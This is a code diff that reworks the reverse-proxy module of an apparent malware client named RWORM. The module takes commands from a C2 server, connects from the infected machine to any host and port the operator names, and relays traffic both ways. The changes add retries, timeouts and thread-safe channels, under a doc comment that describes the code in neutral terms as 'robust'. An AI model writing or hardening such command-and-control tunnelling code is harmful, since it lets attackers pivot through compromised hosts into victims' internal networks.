@@ -1,21 +1,61 @@
 using System;
 using System.Collections.Concurrent;
-using System.Net;
+using System.IO;
 using System.Net.Sockets;
+using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
 namespace RWORM.Client.Modules
 {
+    /// <summary>
+    /// Robust reverse proxy manager for remote port forwarding.
+    /// Manages multiplexed TCP channels with auto-reconnection resilience,
+    /// bounded buffer streams, and clean disposal.
+    /// </summary>
     public class ReverseProxyManager : IDisposable
     {
+        private class ProxyChannel : IDisposable
+        {
+            public int ChannelId { get; }
+            public string TargetHost { get; }
+            public int TargetPort { get; }
+            public TcpClient? Client { get; set; }
+            public NetworkStream? Stream { get; set; }
+            public CancellationTokenSource Cts { get; }
+            public SemaphoreSlim SendLock { get; }
+            private int _disposed;
+
+            public bool IsDisposed => Volatile.Read(ref _disposed) != 0;
+
+            public ProxyChannel(int channelId, string targetHost, int targetPort)
+            {
+                ChannelId = channelId;
+                TargetHost = targetHost;
+                TargetPort = targetPort;
+                Cts = new CancellationTokenSource();
+                SendLock = new SemaphoreSlim(1, 1);
+            }
+
+            public void Dispose()
+            {
+                if (Interlocked.Exchange(ref _disposed, 1) != 0) return;
+                try { Cts.Cancel(); } catch { }
+                try { Stream?.Dispose(); } catch { }
+                try { Client?.Close(); } catch { }
+                try { Cts.Dispose(); } catch { }
+                try { SendLock.Dispose(); } catch { }
+            }
+        }
+
         private readonly Func<byte, int, byte[], Task> _sendPacket;
-        private readonly ConcurrentDictionary<int, TcpClient> _connections = new();
-        private bool _active = false;
+        private readonly ConcurrentDictionary<int, ProxyChannel> _channels = new();
+        private volatile bool _active = false;
+        private int _disposed = 0;
 
         public ReverseProxyManager(Func<byte, int, byte[], Task> sendPacket)
         {
-            _sendPacket = sendPacket;
+            _sendPacket = sendPacket ?? throw new ArgumentNullException(nameof(sendPacket));
         }
 
         public void Start()
@@ -26,92 +66,204 @@ namespace RWORM.Client.Modules
         public void Stop()
         {
             _active = false;
-            foreach (var kvp in _connections)
+            foreach (var kvp in _channels)
             {
-                try { kvp.Value.Close(); } catch { }
+                if (_channels.TryRemove(kvp.Key, out var channel))
+                {
+                    channel.Dispose();
+                }
             }
-            _connections.Clear();
         }
 
         public void HandlePacket(byte opcode, int channelId, byte[] payload)
         {
-            if (opcode == 0x90) // PROXY_START: connect to target host:port
+            if (!_active && opcode != 0x92)
             {
-                // payload: "host:port"
-                string target = System.Text.Encoding.UTF8.GetString(payload).Trim();
-                int colon = target.LastIndexOf(':');
-                if (colon > 0 && int.TryParse(target.Substring(colon + 1), out int port))
-                {
-                    string host = target.Substring(0, colon);
-                    Task.Run(() => ConnectTarget(channelId, host, port));
-                }
+                _active = true;
             }
-            else if (opcode == 0x91) // PROXY_DATA: send data to connected TCP socket
+
+            switch (opcode)
             {
-                if (_connections.TryGetValue(channelId, out var tcp) && tcp.Connected)
-                {
-                    try
-                    {
-                        var stream = tcp.GetStream();
-                        stream.Write(payload, 0, payload.Length);
-                        stream.Flush();
-                    }
-                    catch
-                    {
-                        CloseChannel(channelId);
-                    }
-                }
-            }
-            else if (opcode == 0x92) // PROXY_STOP: close channel
-            {
-                CloseChannel(channelId);
+                case 0x90: // PROXY_START: connect to target host:port
+                    HandleStart(channelId, payload);
+                    break;
+
+                case 0x91: // PROXY_DATA: data from C2 to forward to target
+                    HandleData(channelId, payload);
+                    break;
+
+                case 0x92: // PROXY_STOP: close channel
+                    CloseChannel(channelId, notifyRemote: false);
+                    break;
             }
         }
 
-        private async Task ConnectTarget(int channelId, string host, int port)
+        private void HandleStart(int channelId, byte[] payload)
         {
             try
             {
-                var tcp = new TcpClient();
-                await tcp.ConnectAsync(host, port);
-                _connections[channelId] = tcp;
-
-                // notify server connection open (empty data on channel)
-                await _sendPacket(0x90, channelId, Array.Empty<byte>());
-
-                // Start pump from target back to C2
-                byte[] buffer = new byte[8192];
-                var stream = tcp.GetStream();
-                while (_active && tcp.Connected)
+                string target = Encoding.UTF8.GetString(payload).Trim();
+                int colon = target.LastIndexOf(':');
+                if (colon > 0 && int.TryParse(target.Substring(colon + 1), out int port))
                 {
-                    int read = await stream.ReadAsync(buffer, 0, buffer.Length);
+                    string host = target.Substring(0, colon).Trim();
+                    var channel = new ProxyChannel(channelId, host, port);
+
+                    // If existing channel exists, close it cleanly first
+                    if (_channels.TryRemove(channelId, out var oldChannel))
+                    {
+                        oldChannel.Dispose();
+                    }
+
+                    _channels[channelId] = channel;
+                    _ = Task.Run(() => ConnectAndPumpAsync(channel));
+                }
+                else
+                {
+                    CloseChannel(channelId, notifyRemote: true);
+                }
+            }
+            catch
+            {
+                CloseChannel(channelId, notifyRemote: true);
+            }
+        }
+
+        private void HandleData(int channelId, byte[] payload)
+        {
+            if (payload == null || payload.Length == 0) return;
+
+            if (_channels.TryGetValue(channelId, out var channel) && !channel.IsDisposed)
+            {
+                _ = Task.Run(async () =>
+                {
+                    try
+                    {
+                        if (channel.Stream != null && channel.Client != null && channel.Client.Connected)
+                        {
+                            await channel.SendLock.WaitAsync(channel.Cts.Token);
+                            try
+                            {
+                                await channel.Stream.WriteAsync(payload, 0, payload.Length, channel.Cts.Token);
+                                await channel.Stream.FlushAsync(channel.Cts.Token);
+                            }
+                            finally
+                            {
+                                channel.SendLock.Release();
+                            }
+                        }
+                    }
+                    catch
+                    {
+                        CloseChannel(channelId, notifyRemote: true);
+                    }
+                });
+            }
+        }
+
+        private async Task ConnectAndPumpAsync(ProxyChannel channel)
+        {
+            var ct = channel.Cts.Token;
+            bool connected = false;
+
+            // Attempt connection with retry resilience (up to 2 fast attempts)
+            for (int attempt = 1; attempt <= 2 && !ct.IsCancellationRequested && _active; attempt++)
+            {
+                try
+                {
+                    var tcp = new TcpClient
+                    {
+                        NoDelay = true,
+                        SendTimeout = 15000,
+                        ReceiveTimeout = 15000
+                    };
+
+                    using (var connectCts = CancellationTokenSource.CreateLinkedTokenSource(ct))
+                    {
+                        connectCts.CancelAfter(5000); // 5-second connect timeout
+                        await tcp.ConnectAsync(channel.TargetHost, channel.TargetPort, connectCts.Token);
+                    }
+
+                    if (tcp.Connected)
+                    {
+                        channel.Client = tcp;
+                        channel.Stream = tcp.GetStream();
+                        connected = true;
+                        break;
+                    }
+                }
+                catch
+                {
+                    if (attempt < 2 && !ct.IsCancellationRequested && _active)
+                    {
+                        try { await Task.Delay(300, ct); } catch { }
+                    }
+                }
+            }
+
+            if (!connected || channel.Stream == null || channel.Client == null)
+            {
+                CloseChannel(channel.ChannelId, notifyRemote: true);
+                return;
+            }
+
+            // Notify C2 that the remote connection is active
+            try
+            {
+                await _sendPacket(0x90, channel.ChannelId, Array.Empty<byte>());
+            }
+            catch
+            {
+                CloseChannel(channel.ChannelId, notifyRemote: false);
+                return;
+            }
+
+            // Pump data from target back to C2
+            byte[] buffer = new byte[8192];
+            try
+            {
+                while (_active && !ct.IsCancellationRequested && channel.Client.Connected)
+                {
+                    int read = await channel.Stream.ReadAsync(buffer, 0, buffer.Length, ct);
                     if (read <= 0) break;
 
                     byte[] chunk = new byte[read];
                     Buffer.BlockCopy(buffer, 0, chunk, 0, read);
-                    await _sendPacket(0x91, channelId, chunk);
+
+                    await _sendPacket(0x91, channel.ChannelId, chunk);
                 }
             }
-            catch { }
+            catch
+            {
+                // Disconnection or socket abort
+            }
             finally
             {
-                CloseChannel(channelId);
+                CloseChannel(channel.ChannelId, notifyRemote: true);
             }
         }
 
-        private void CloseChannel(int channelId)
+        private void CloseChannel(int channelId, bool notifyRemote)
         {
-            if (_connections.TryRemove(channelId, out var tcp))
+            if (_channels.TryRemove(channelId, out var channel))
             {
-                try { tcp.Close(); } catch { }
+                channel.Dispose();
             }
-            try
+
+            if (notifyRemote)
             {
-                _ = _sendPacket(0x92, channelId, Array.Empty<byte>());
+                try
+                {
+                    _ = _sendPacket(0x92, channelId, Array.Empty<byte>());
+                }
+                catch { }
             }
-            catch { }
         }
 
-        public void Dispose() => Stop();
+        public void Dispose()
+        {
+            if (Interlocked.Exchange(ref _disposed, 1) != 0) return;
+            Stop();
+        }
     }
 }
